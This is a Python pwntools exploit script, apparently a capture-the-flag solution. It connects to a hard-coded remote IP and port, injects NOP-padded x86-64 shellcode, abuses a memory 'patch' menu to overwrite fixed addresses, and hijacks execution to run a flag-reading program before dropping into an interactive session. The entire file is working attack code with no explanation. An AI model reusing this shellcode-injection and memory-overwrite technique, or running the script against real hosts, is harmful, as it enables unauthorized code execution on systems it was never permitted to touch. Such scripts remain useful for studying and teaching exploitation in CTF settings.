#!/usr/bin/env python3

from pwn import *


def patch(addr, size, data):
    p.sendafter("?:", "3")
    p.sendafter("addr: ", p64(addr))
    p.sendafter("size: ", p64(size))
    p.sendafter("data: ", data)


def gogo():
    payload = asm("""
        mov rcx, 0xbabecafe000
        mov rax, 0xdeadbeef000
        mov [rcx], rax
        mov rdx, 0xdeadbeef066
        call rdx
        hlt
        """)
    p.send(payload.ljust(0x1000 - 0xd, b"\x90"))
    p.sendafter("?:", "2")

    payload2 = asm("""
        mov rcx, 0xbabecafe233
        mov rax, 0xbabecafe800
        mov [rcx], rax
        hlt
        """)

    patch(0xdeadbef0000, len(payload2), payload2)
    cmd = b"k33nlab/readflag\x00"
    patch(0xbabecafe800, len(cmd), cmd)
    patch(0xbabecafe000, 8, p64(0xdeadbef0000))

    p.interactive()


if __name__ == '__main__':
    context.arch = "amd64"
    context.os = "linux"
    p = remote("111.186.59.29", 10087)
    gogo()